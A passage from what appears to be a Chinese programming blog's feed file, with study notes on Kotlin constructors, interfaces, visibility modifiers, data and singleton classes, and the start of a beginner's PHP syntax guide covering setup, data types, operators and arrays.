class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">package com.example.damo1</span><br><span class="line"></span><br><span class="line">fun main()&#123;</span><br><span class="line">    val s=son(&quot;G0od3r4in&quot;,999)</span><br><span class="line">    val f=father()</span><br><span class="line">    s.son_do()</span><br><span class="line">    f.father_do()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250604184943089.png" alt="image-20250604184943089"></p><p>如果父类也是有参构造呢</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注意父类的参数如果是使用var/val声明的子类构造不能使用var或val会引起冲突，如果父类是普通参数就可以使用var/val进行覆盖</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">package com.example.damo1</span><br><span class="line"></span><br><span class="line">fun main()&#123;</span><br><span class="line">    val s=son(&quot;G0od3r4in&quot;,999)</span><br><span class="line">    val f=father(&quot;g3_father&quot;,99999)</span><br><span class="line">    s.son_do()</span><br><span class="line">    s.father_do()</span><br><span class="line">    f.father_do()</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">package com.example.damo1</span><br><span class="line"></span><br><span class="line">class son(name:String , time:Int):father(name,time)&#123;</span><br><span class="line">    fun son_do()&#123;</span><br><span class="line">        println(name+&quot; can study and sustain &quot;+time)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">package com.example.damo1</span><br><span class="line"></span><br><span class="line">open class father(val name:String ,val time:Int)&#123;</span><br><span class="line">    fun father_do()&#123;</span><br><span class="line">        println(name+&quot; can work and sustain &quot;+time)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250604190548472.png" alt="image-20250604190548472"></p><h5 id="次构造"><a href="#次构造" class="headerlink" title="次构造"></a>次构造</h5><p>为什么会有此构造呢，在我们传参数的过程中，有些时候有些情况不一定都是拥有所有的构造参数，所以我们寻求更多的构造方式，而对于未传入的参数字符串默认为“”，int默认为0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">package com.example.damo1</span><br><span class="line"></span><br><span class="line">class son(name:String , time:Int):father(name,time)&#123;</span><br><span class="line">    constructor(name: String):this(name,1)&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    fun son_do()&#123;</span><br><span class="line">        println(name+&quot; can study and sustain &quot;+time)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">package com.example.damo1</span><br><span class="line"></span><br><span class="line">fun main()&#123;</span><br><span class="line">    val s=son(&quot;G0od3r4in&quot;)</span><br><span class="line">    val f=father(&quot;g3_father&quot;,99999)</span><br><span class="line">    s.son_do()</span><br><span class="line">    s.father_do()</span><br><span class="line">    f.father_do()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意</strong></p><p>次构造不能直接加上val&#x2F;var属性，若想属性可见要加上private</p><h5 id="无主构造"><a href="#无主构造" class="headerlink" title="无主构造"></a>无主构造</h5><p>简而言之就是没有主构造只有次构造</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">package com.example.damo1</span><br><span class="line"></span><br><span class="line">class son:father&#123;</span><br><span class="line">    constructor(name: String,age:Int,grade:String):super(name,age)&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    fun son_do()&#123;</span><br><span class="line">        println(name+&quot; can study and sustain &quot;+time)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250604193007205.png" alt="image-20250604193007205"></p><p>在构造方法中我们添加了一个父类没有的参数grade，可是为什么这个参数会在我们在其他函数调用的时候报错呢，而为什么name和age不会报错呢，原因是因为父类使用的是主构造他给name和age加上了var或val属性可被外界函数读取，看下表</p><table><thead><tr><th align="left">声明方式</th><th align="left">示例</th><th align="left">是否成为属性</th><th align="left">可访问范围</th></tr></thead><tbody><tr><td align="left"><strong>普通参数</strong></td><td align="left"><code>(grade: String)</code></td><td align="left">❌ 不是属性</td><td align="left">仅构造函数内部</td></tr><tr><td align="left"><strong><code>val</code> 参数</strong></td><td align="left"><code>(val grade: String)</code></td><td align="left">✅ 只读属性</td><td align="left">整个类 + 外部可见</td></tr><tr><td align="left"><strong><code>var</code> 参数</strong></td><td align="left"><code>(var grade: String)</code></td><td align="left">✅ 可变属性</td><td align="left">整个类 + 外部可修改</td></tr></tbody></table><p>而使用grade就导致她没有属性，故在其他函数不能被调用</p><h3 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h3><p>学习一个东西我们首先要知道她有什么用是吧，接口有什么用呢，其实笔者也不知道，因为笔者java学的也不是很好，但是笔者通过不断的找资料学习，最重要的是问ai知道了，下面笔者就简单解释一下笔者理解的接口</p><h4 id="接口有什么用"><a href="#接口有什么用" class="headerlink" title="接口有什么用"></a>接口有什么用</h4><ul><li><strong>定义契约</strong></li><li><strong>实现多继承</strong></li><li><strong>解耦</strong></li></ul><p>前面两个都好理解，定义契约的意思就是你继承了这个接口，接口中的方法和属性你就都要实现，实现多继承呢就是你不止可以继承一个接口，你可以继承很多个接口</p><p>最后一个解耦是什么意思呢，看着就绕口，下面我借用ai的话来解释</p><hr><p><strong>用简单例子理解 Kotlin 接口如何解耦</strong></p><p>我举个生活中的例子帮你理解接口的解耦作用：</p><p><strong>现实生活比喻</strong></p><p>想象你有一部手机（主程序）和一个充电器（依赖组件）：</p><p>❌ <strong>紧耦合的情况</strong>（不好）：</p><ul><li>你的手机只能使用原装充电器</li><li>充电器坏了就必须找原厂修</li><li>出国旅行发现插座不兼容就充不了电</li></ul><p>✅ <strong>解耦后的情况</strong>（使用接口）：</p><ul><li>手机设计成”支持USB-C接口”（这就是接口）</li><li>任何符合USB-C标准的充电器、充电宝、电脑都能用</li><li>你可以自由更换充电器，手机本身不需要任何修改</li></ul><p><strong>代码示例对比</strong></p><p><strong>紧耦合的代码（问题）</strong></p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 手机直接依赖特定充电器</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyPhone</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">val</span> charger = OriginalCharger() <span class="comment">// 只能用自己的充电器</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">charge</span><span class="params">()</span></span> &#123;</span><br><span class="line">        charger.plugIn()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 出国旅行时：</span></span><br><span class="line"><span class="keyword">val</span> phone = MyPhone()</span><br><span class="line">phone.charge() <span class="comment">// 如果OriginalCharger不兼容当地插座就完了</span></span><br></pre></td></tr></table></figure><p><strong>解耦后的代码（解决方案）</strong></p><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义充电接口（相当于USB-C标准）</span></span><br><span class="line"><span class="keyword">interface</span> <span class="title class_">Charger</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">plugIn</span><span class="params">()</span></span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 手机只依赖接口</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyPhone</span>(<span class="keyword">private</span> <span class="keyword">val</span> charger: Charger) &#123; <span class="comment">// 接受任何符合接口的充电器</span></span><br><span class="line">    <span class="function"><span class="keyword">fun</span> <span class="title">charge</span><span class="params">()</span></span> &#123;</span><br><span class="line">        charger.plugIn()</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 各种充电器实现</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">OriginalCharger</span> : <span class="type">Charger</span> &#123; <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">plugIn</span><span class="params">()</span></span> &#123; ... &#125; &#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TravelCharger</span> : <span class="type">Charger</span> &#123; <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">plugIn</span><span class="params">()</span></span> &#123; ... &#125; &#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">PowerBank</span> : <span class="type">Charger</span> &#123; <span class="keyword">override</span> <span class="function"><span class="keyword">fun</span> <span class="title">plugIn</span><span class="params">()</span></span> &#123; ... &#125; &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用时：</span></span><br><span class="line"><span class="keyword">val</span> phone1 = MyPhone(OriginalCharger()) <span class="comment">// 家用原装</span></span><br><span class="line"><span class="keyword">val</span> phone2 = MyPhone(TravelCharger())   <span class="comment">// 旅行时换旅行充电器</span></span><br><span class="line"><span class="keyword">val</span> phone3 = MyPhone(PowerBank())       <span class="comment">// 户外用电宝</span></span><br></pre></td></tr></table></figure><p><strong>为什么这叫”解耦”？</strong></p><p>因为：</p><ol><li><strong>手机不再绑死</strong>于特定充电器（解开了耦合）</li><li><strong>充电器可以独立变化</strong>：只要遵守接口标准，新型号充电器不用改手机代码</li><li><strong>更容易维护</strong>：充电器坏了换一个就行，不用修手机</li></ol><p><strong>实际编程中的好处</strong></p><ol><li><strong>改A不影响B</strong>：修改充电器实现不会影响手机代码</li><li><strong>方便测试</strong>：测试时可以用”假充电器”代替真充电器</li><li><strong>扩展容易</strong>：随时新增无线充电器等新型号</li></ol><hr><p>再简化就是你定义了一个充电接口，只要满足充电接口的充电器你都可以使用，这样就好理解了吧</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">用户操作                  MyPhone                 OriginalCharger</span><br><span class="line">  |                        |                           |</span><br><span class="line">  | 创建MyPhone实例         |                           |</span><br><span class="line">  |-----------------------&gt;|                           |</span><br><span class="line">  |  传入OriginalCharger    |                           |</span><br><span class="line">  |                        |----存储charger引用--------&gt;|</span><br><span class="line">  |                        |                           |</span><br><span class="line">  | 调用charge()方法        |                           |</span><br><span class="line">  |-----------------------&gt;|                           |</span><br><span class="line">  |                        | 调用charger.plugIn()       |</span><br><span class="line">  |                        |---------------------------&gt;|</span><br><span class="line">  |                        |                           | 执行原装充电器特有逻辑</span><br><span class="line">  |                        |&lt;---------------------------|</span><br><span class="line">  | 显示充电结果            |                           |</span><br><span class="line">  |&lt;-----------------------|                           |</span><br></pre></td></tr></table></figure><h4 id="接口的定义"><a href="#接口的定义" class="headerlink" title="接口的定义"></a>接口的定义</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">interface jiekou&#123;</span><br><span class="line">fun 方法1()</span><br><span class="line">fun 方法2()</span><br><span class="line">fun 方法3()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="接口的继承"><a href="#接口的继承" class="headerlink" title="接口的继承"></a>接口的继承</h4><p>继承接口只需在后用<code>&quot;:&quot;</code>拼接</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">package com.example.damo1</span><br><span class="line"></span><br><span class="line">interface itf&#123;</span><br><span class="line">    fun mothod()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class a :itf&#123;</span><br><span class="line">    override fun mothod()&#123;</span><br><span class="line">        println(&quot;ok&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fun main()&#123;</span><br><span class="line">    val a1=a()</span><br><span class="line">    a1.mothod()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250604210108185.png" alt="image-20250604210108185"></p><h4 id="接口的多继承"><a href="#接口的多继承" class="headerlink" title="接口的多继承"></a>接口的多继承</h4><p>不同的接口之间使用,分隔</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">package com.example.damo1</span><br><span class="line"></span><br><span class="line">interface itf&#123;</span><br><span class="line">    fun mothod()</span><br><span class="line">&#125;</span><br><span class="line">interface itf1&#123;</span><br><span class="line">    fun mothod1()</span><br><span class="line">&#125;</span><br><span class="line">class a :itf,itf1&#123;</span><br><span class="line">    override fun mothod()&#123;</span><br><span class="line">        println(&quot;ok&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">    override fun mothod1()&#123;</span><br><span class="line">        println(&quot;ok1&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fun main()&#123;</span><br><span class="line">    val a1=a()</span><br><span class="line">    a1.mothod()</span><br><span class="line">    a1.mothod1()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250604210228066.png" alt="image-20250604210228066"></p><h3 id="权限修饰符"><a href="#权限修饰符" class="headerlink" title="权限修饰符"></a>权限修饰符</h3><table><thead><tr><th>修饰符</th><th>Java</th><th>Kotlin</th></tr></thead><tbody><tr><td>public</td><td>所有类可见</td><td>所有类可见（默认）</td></tr><tr><td>private</td><td>当前类可见</td><td>当前类可见</td></tr><tr><td>protected</td><td>当前类，子类，同包下类可见</td><td>当前类，子类可见</td></tr><tr><td>default</td><td>同包下类可见（默认）</td><td>无</td></tr><tr><td>internal</td><td>无</td><td>同模块下的类可见</td></tr></tbody></table><h3 id="数据类和单例类"><a href="#数据类和单例类" class="headerlink" title="数据类和单例类"></a>数据类和单例类</h3><h4 id="数据类"><a href="#数据类" class="headerlink" title="数据类"></a>数据类</h4><p>数据类是 Kotlin 中专门用于存储数据的特殊类，自动提供了一些标准功能。</p><p><strong>语法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data class User(val name: String, val age: Int)</span><br></pre></td></tr></table></figure><ol><li>主构造函数必须至少有一个参数</li><li>所有主构造函数参数必须标记为 <code>val</code> 或 <code>var</code></li><li>不能是抽象、开放、密封或内部类</li></ol><p><strong>特征</strong></p><p><strong>自动生成的函数</strong>：</p><ul><li><code>equals()</code>&#x2F;<code>hashCode()</code></li><li><code>toString()</code> (格式为 “User(name&#x3D;John, age&#x3D;42)”)</li><li><code>componentN()</code> 函数 (用于解构声明)</li><li><code>copy()</code> 函数</li></ul><h4 id="单例类"><a href="#单例类" class="headerlink" title="单例类"></a>单例类</h4><p>在 Kotlin 中实现单例非常简单，使用 <code>object</code> 关键字即可。</p><p><strong>语法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">object Singleton &#123;</span><br><span class="line">    init &#123;</span><br><span class="line">        println(&quot;Singleton initialized&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    fun doSomething() &#123;</span><br><span class="line">        println(&quot;Doing something&quot;)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>特征</strong></p><ol><li><strong>线程安全</strong>：Kotlin 的单例是线程安全的</li><li><strong>懒加载</strong>：只在第一次访问时初始化</li><li><strong>不能有构造函数</strong></li></ol><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/Javachichi/article/details/131677550?ops_request_misc=%7B%22request_id%22:%226ac6018f2704d67e8bb29805bd79fc48%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=6ac6018f2704d67e8bb29805bd79fc48&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-131677550-null-null.142%5Ev102%5Econtrol&utm_term=Kotlin&spm=1018.2226.3001.4187">Kotlin入门学习(非常详细)，从零基础入门到精通，看完这一篇就够了-CSDN博客</a></p><p><a href="https://www.runoob.com/java/java-interfaces.html">Java 接口 | 菜鸟教程</a></p><p><a href="https://www.runoob.com/kotlin/kotlin-tutorial.html">Kotlin 教程 | 菜鸟教程</a></p>]]></content>
      
      
      <categories>
          
          <category> 编程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 安卓 </tag>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP了解</title>
      <link href="/2025/05/12/web/PHP%E4%BA%86%E8%A7%A3/"/>
      <url>/2025/05/12/web/PHP%E4%BA%86%E8%A7%A3/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP学习笔记"><a href="#PHP学习笔记" class="headerlink" title="PHP学习笔记"></a>PHP学习笔记</h1><p>由于这次学习主要目的只是为了能看懂PHP语言，所以就不深入学习，只学习最基本的</p><h2 id="什么是PHP"><a href="#什么是PHP" class="headerlink" title="什么是PHP"></a>什么是PHP</h2><p>PHP（Hypertext Preprocessor）一种广泛使用的开源服务器端脚本语言，用于web开发</p><p>PHP可以嵌入HTML，与多个数据库集成，最常用的是MySQL</p><h2 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h2><p><strong>环境</strong></p><p>安装<a href="https://www.xp.cn/php-study">小皮面板(phpstudy) - 让天下没有难配的服务器环境！</a></p><p><strong>开发工具</strong></p><p>安装<a href="https://vscode.p2hp.com/">https://vscode.p2hp.com/</a></p><p>在vscode中运行记得将php配置到Path环境变量</p><p>我这里是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">D:\phpstudy_pro\Extensions\php\php7.3.4nts</span><br></pre></td></tr></table></figure><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><h3 id="格式"><a href="#格式" class="headerlink" title="格式"></a>格式</h3><p>PHP脚本可以放在文件中的任何位置</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//代码</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>php使用的注释方式是 <code>//</code></p><h3 id="打印"><a href="#打印" class="headerlink" title="打印"></a>打印</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;Hello World!&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><p>语法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$变量名=变量值</span><br></pre></td></tr></table></figure><h3 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">String 字符串</span><br><span class="line">Integer 整型</span><br><span class="line">Float 浮点型</span><br><span class="line">Boolean 布尔型</span><br><span class="line">Array 数组</span><br><span class="line">Object 对象</span><br><span class="line">NULL 空值</span><br><span class="line">Resour</span><br></pre></td></tr></table></figure><ul><li><p><strong>字符串</strong></p><p>和python一样直接将字符串包裹在双引号或单引号中然后赋值给变量</p></li><li><p><strong>整型</strong></p><p>没有小数的数字，直接将数据赋值给变量</p></li><li><p><strong>浮点型</strong></p><p>带有小数的数字</p></li><li><p><strong>布尔</strong></p><p>只有TRUE和FALSE</p></li><li><p><strong>对象</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"> </span><br><span class="line">    //类名</span><br><span class="line">    class Ok&#123;</span><br><span class="line">      //属性</span><br><span class="line">      var $ok;</span><br><span class="line">      //方法</span><br><span class="line">      function fun1() &#123;</span><br><span class="line">        echo &quot;方法1&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></li><li><p><strong>NULL</strong></p><p>没有值</p></li></ul><p><strong>var_dump()</strong></p><p>可以用来查看变量的值和类型</p><p><img src="https://raw.githubusercontent.com/likunvs/images/main/images/image-20250412162513236.png" alt="image-20250412162513236"></p><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><p>PHP的运算符和其他语言基本一致</p><ul><li><p>算数运算符</p><p>+，-，*，&#x2F;，%</p></li><li><p>赋值运算符</p><p>&#x3D;,+&#x3D;,-&#x3D;,*&#x3D;,&#x2F;&#x3D;,%&#x3D;,.&#x3D;</p><p>其中.&#x3D;表示连接两个字符串</p></li><li><p>递增递减运算符</p><p>++x预递增，–x预递减，x++递增，x–递减</p></li><li><p>比较运算符</p><p><code>&gt;</code>大于，<code>&lt;</code>小于，<code>&gt;=</code>大于扽与，<code>&lt;=</code>小于等于  <code>==</code> 相等   <code>===</code>  完全相等   <code>!=</code>非等</p><p>完全相等，表示的是数据的值和类型完全相同</p></li><li><p>逻辑运算符</p><p>&amp;&amp;与，||或， ！非</p></li></ul><h3 id="循环控制语句"><a href="#循环控制语句" class="headerlink" title="循环控制语句"></a>循环控制语句</h3><ul><li>顺序结构</li><li>选择结构</li><li>循环结构</li></ul><p><strong>总结</strong></p><p>if</p><p>if else</p><p>while</p><p>do-while</p><p>for</p><h3 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h3><h4 id="创建数组"><a href="#创建数组" class="headerlink" title="创建数组"></a>创建数组</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="读取数组"><a href="#读取数组" class="headerlink" title="读取数组"></a>读取数组</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>[<span class="number">0</span>],<span class="variable">$a</span>[<span class="number">1</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$a</span>[0],<span class="subst">$a</span>[1]&quot;</span>;</span><br><span class="line"><span class="meta">?&gt;</span>ababa,b</span><br></pre></td></tr></table></figure><h4 id="获取长度"><a href="#获取长度" class="headerlink" title="获取长度"></a>获取长度</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">array</span>(<span class="string">&#x27;a&#x27;</span>,<span class="string">&#x27;b&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">count</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span><span class="number">2</span></span><br></pre></td></tr></table></figure><h4 id="遍历数组"><a href="#遍历数组" class="headerlink" title="遍历数组"></a>遍历数组</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">array</span>(<span class="string">&quot;a&quot;</span>,<span class="string">&quot;b&quot;</span>);</span><br><span class="line">    <span class="variable">$alen</span>=<span class="title function_ invoke__">count</span>(<span class="variable">$a</span>);</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$x</span>=<span class="number">0</span>;<span class="variable">$x</span>&lt;<span class="variable">$alen</span>;<span class="variable">$x</span>++)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$a</span>[<span class="variable">$x</span>];</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span>a&lt;br&gt;b&lt;br&gt;</span><br></pre></td></tr></table></figure><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p><strong>语法</strong></p><figure 